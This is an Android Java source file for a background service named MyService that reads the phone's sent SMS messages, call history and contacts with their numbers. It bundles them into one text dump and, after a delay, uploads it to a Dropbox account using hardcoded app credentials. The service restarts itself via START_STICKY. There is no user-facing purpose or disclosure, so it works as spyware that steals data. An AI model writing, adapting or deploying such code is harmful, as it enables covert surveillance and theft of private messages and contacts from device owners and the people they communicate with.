package com.mobilki.getinfoservice;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.dropbox.client2.DropboxAPI;
import com.dropbox.client2.android.AndroidAuthSession;
import com.dropbox.client2.session.AppKeyPair;

import java.util.ArrayList;
import java.util.Date;

public class MyService extends Service {

    private static final String TAG = "MyService";
    private static final String DROPBOX_NAME = "dropbox_prefs";

    private ArrayList<String> messages = new ArrayList<>();
    private ArrayList<String> calls = new ArrayList<>();
    private ArrayList<String> contacts = new ArrayList<>();

    private DropboxAPI<AndroidAuthSession> mDBApi;
    final static private String APP_KEY = "0m59v14eqmnfjy1";
    final static private String APP_SECRET = "vao8onh3ircq9pg";

    private void getMessages() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            messages.add("READ_SMS permission isn't granted");
            return;
        }
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
        assert cursor != null;

        while(cursor.moveToNext()){
            String address = cursor.getString(cursor.getColumnIndex("address"));
            String body = cursor.getString(cursor.getColumnIndex("body"));
            String date = cursor.getString(cursor.getColumnIndex("date"));
            messages.add("Number: " + address + ", Date: " + new Date(Long.valueOf(date)) + ", Message: " + body);
        }
        cursor.close();
        Log.d(TAG, "getMessages");
    }

    private void getCallHistory() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            calls.add("READ_CALL_LOG permission isn't granted");
            return;
        }
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        assert cursor != null;
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()){
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            calls.add("\nPhone Number: " + phNumber + " \nCall Type: "
                    + dir + " \nCall Date: " + callDayTime
                    + " \nCall duration in sec : " + callDuration + "\n");
        }
        cursor.close();
        Log.d(TAG, "getCallHistory");
    }

    private void getContactList(){
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            contacts.add("READ_CALL_LOG permission isn't granted");
            return;
        }
        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        assert cursor != null;
        int id = cursor.getColumnIndex(ContactsContract.Contacts._ID);
        int name = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
        int hasNumber = cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER);
        while (cursor.moveToNext()){
            String contId = cursor.getString(id);
            String contName = cursor.getString(name);
            if (cursor.getInt(hasNumber) > 0){
                Cursor phCursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{contId}, null);
                assert phCursor != null;
                int number = phCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                while(phCursor.moveToNext()){
                    String phNumber = phCursor.getString(number); //java.lang.IllegalStateException: Couldn't read row 0, col -1 from CursorWindow.  Make sure the Cursor is initialized correctly before accessing data from it.
                    contacts.add("Name: " + contName + ", Phone number: " + phNumber);
                }
                phCursor.close();
            }
            else{
                contacts.add("Name: " + contName);
            }
        }
        cursor.close();
        Log.d(TAG, "getContacts");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        getMessages();
        getCallHistory();
        getContactList();

        String uploadingData = "SMS:\n\n";
        for (int i = 0; i < messages.size(); i++){
            uploadingData += messages.get(i) + '\n';
        }
        uploadingData += "\n----------------------------------\n\nCall History:\n";
        for (int i = 0; i < calls.size(); i++){
            uploadingData += calls.get(i) + '\n';
        }
        uploadingData += "----------------------------------\n\nContacts:\n\n";
        for (int i = 0; i < contacts.size(); i++){
            uploadingData += contacts.get(i) + '\n';
        }
        uploadingData += "\n----------------------------------";

        final Handler handler = new Handler();
        final String finalUploadingData = uploadingData;
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                UploadInfo upload = new UploadInfo(mDBApi, finalUploadingData);
                upload.execute();
            }
        }, 20000);


        Log.d(TAG, "onStartCommand");
        return START_STICKY;
    }

    protected void finishAuth(){
        AndroidAuthSession session = mDBApi.getSession();
        if (session.authenticationSuccessful()) {
            try {
                session.finishAuthentication();
                String token = session.getOAuth2AccessToken();
                SharedPreferences prefs = getSharedPreferences(DROPBOX_NAME, Context.MODE_PRIVATE);
                SharedPreferences.Editor editor = prefs.edit();
                editor.putString("accessToken", token);
                editor.commit();
            } catch (IllegalStateException e){
                Log.e("MyService", "Error during Dropbox Auth");
            }
        }
    }


    @Override
    public void onCreate() {
        super.onCreate();

        AndroidAuthSession session;
        AppKeyPair appKeys = new AppKeyPair(APP_KEY, APP_SECRET);

        SharedPreferences prefs = getSharedPreferences(DROPBOX_NAME, Context.MODE_PRIVATE);
        String token = prefs.getString("accessToken", null);

        if (token != null) {
            session = new AndroidAuthSession(appKeys, token);
            mDBApi = new DropboxAPI<>(session);

        } else {
            session = new AndroidAuthSession(appKeys);
            mDBApi = new DropboxAPI<>(session);
            mDBApi.getSession().startOAuth2Authentication(MyService.this);
            final Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    finishAuth();
                }
            }, 10000);
        }

        Log.d(TAG, "onCreate");
    }
}